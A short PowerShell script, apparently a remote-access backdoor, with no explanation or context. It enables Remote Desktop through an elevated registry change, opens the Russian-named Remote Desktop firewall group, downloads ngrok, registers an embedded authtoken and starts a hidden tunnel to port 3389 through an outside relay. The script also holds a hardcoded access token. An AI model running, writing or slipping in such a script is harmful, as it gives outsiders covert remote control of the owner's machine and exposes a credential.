$ngrokToken = "2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua"
$ngrokPath = "$env:APPDATA\ngrok"
$ngrokExe = "$ngrokPath\ngrok.exe"
$zipPath = "$env:TEMP\ngrok.zip"

Start-Process reg -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb runAs
netsh advfirewall firewall set rule group="Удаленный рабочий стол" new enable=Yes

if (-Not (Test-Path $ngrokExe)) {
    Invoke-WebRequest -Uri "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $ngrokPath -Force
}

if (-Not (Test-Path "$env:USERPROFILE\.ngrok2\ngrok.yml")) {
    & $ngrokExe config add-authtoken $ngrokToken
}

cd $env:USERPROFILE\Downloads
Start-Process ngrok.exe "tcp 3389" -WindowStyle Hidden
